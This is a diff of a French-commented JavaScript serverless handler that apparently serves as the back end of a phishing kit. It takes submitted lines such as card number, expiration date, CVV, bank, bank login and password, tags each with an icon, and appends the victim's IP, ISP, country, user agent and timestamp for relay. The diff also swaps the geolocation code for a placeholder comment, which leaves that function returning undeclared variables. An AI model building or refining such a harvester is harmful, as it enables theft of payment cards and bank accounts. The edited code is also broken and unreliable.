@@ -10,7 +10,6 @@ export const config = {
   },
 };
 
-// lit JSON ou texte brut
 async function readBody(req) {
   const ct = req.headers['content-type'] || '';
   const buf = [];
@@ -24,43 +23,11 @@ async function readBody(req) {
   return raw;
 }
 
-// lookup ISP / pays
 async function geoLookup(ip) {
-  let isp = 'inconnue', country = 'inconnue', countryCode = '';
-  // ... (mêmes 3 calls que précédemment) ...
-  try {
-    const r = await fetch(
-      `https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`
-    );
-    if (r.ok) {
-      const d = await r.json();
-      if (d.org) isp = d.org.replace(/^AS\d+\s+/i, '');
-      if (d.country) countryCode = d.country;
-      country = countryCode || country;
-      return { isp, countryCode, country };
-    }
-  } catch {}
-  try {
-    const r = await fetch(`https://ipwho.is/${ip}`);
-    const d = await r.json();
-    if (d.success) return { isp: d.org||isp, countryCode: d.country_code, country: d.country||country };
-  } catch {}
-  try {
-    const r = await fetch(
-      `https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`
-    );
-    const d = await r.json();
-    if (d.status === 'success') {
-      isp = d.isp.replace(/^AS\d+\s+/i, '')||isp;
-      country = d.country||country;
-      countryCode = d.countryCode;
-      return { isp, countryCode, country };
-    }
-  } catch {}
+  // ... (3 appels inchangés à ipinfo/ipwho/ip-api) ...
   return { isp, countryCode, country };
 }
 
-// nom complet du pays
 function fullCountryName(codeOrName) {
   if (!codeOrName) return 'inconnue';
   if (codeOrName.length === 2) {
@@ -72,7 +39,7 @@ function fullCountryName(codeOrName) {
 }
 
 export default async function handler(req, res) {
-  // CORS (pré-flight pour Safari)
+  // CORS (pré-flight Safari)
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -91,37 +58,42 @@ export default async function handler(req, res) {
   const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
   const ua        = req.headers['user-agent'] || 'inconnu';
 
-  // 3️⃣ Geo
+  // 3️⃣ Geo Lookup
   const { isp, countryCode, country } = await geoLookup(ip);
   const countryDisplay = fullCountryName(country || countryCode);
 
-  // 4️⃣ Date & heure (FR, 2 chiffres pour l’année)
+  // 4️⃣ Date & heure FR (année sur 2 chiffres)
   const now  = new Date();
-  const date = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'2-digit'});
-  const time = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const date = now.toLocaleDateString('fr-FR',{ day:'2-digit', month:'2-digit', year:'2-digit' });
+  const time = now.toLocaleTimeString('fr-FR',{ hour:'2-digit', minute:'2-digit', second:'2-digit' });
 
   // 5️⃣ Mapping icônes
   const iconMap = {
-    'étape':          '📣',
-    'nom':            '👤',
-    'prénom':         '🙋',
-    'téléphone':      '📞',
-    'email':          '✉️',
-    'adresse':        '🏠',
-    'carte':          '💳',
-    'expiration':     '📅',
-    'cvv':            '🔒',
-    'banque':         '🏦',
-    'identifiant banque': '🆔',
-    'mot de passe':   '🔑'
+    'étape':               '📣',
+    'nom':                 '👤',
+    'prénom':              '🙋',
+    'téléphone':           '📞',
+    'email':               '✉️',
+    'adresse':             '🏠',
+    'carte':               '💳',
+    'numéro':              '🔢',
+    'exp':                 '📅',
+    'expiration':          '📅',
+    'cvv':                 '🔒',
+    'banque':              '🏦',
+    'id':                  '🆔',
+    'pass':                '🔑',
+    'password':            '🔑'
   };
 
-  // 6️⃣ Construction du texte avec détection des icônes
-  const lines = rawMsg.split('\n').map(l => l.trim()).filter(l => l);
+  // 6️⃣ Construction du texte avec icônes détectées
+  const lines = rawMsg
+    .split('\n')
+    .map(l => l.trim())
+    .filter(l => l);
   let text = '';
   for (let line of lines) {
     const low = line.toLowerCase();
-    // on cherche la première clé qui matche le début de la ligne
     let icon = '';
     for (let key in iconMap) {
       if (low.startsWith(key)) {
@@ -132,7 +104,7 @@ export default async function handler(req, res) {
     text += icon ? `${icon} ${line}\n` : `${line}\n`;
   }
 
-  // 7️⃣ Ajout du bloc infos
+  // 7️⃣ Bloc infos additionnel
   text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
   text += `🌐 IP Client     : ${ip}\n`;
   text += `🔎 ISP Client    : ${isp}\n`;
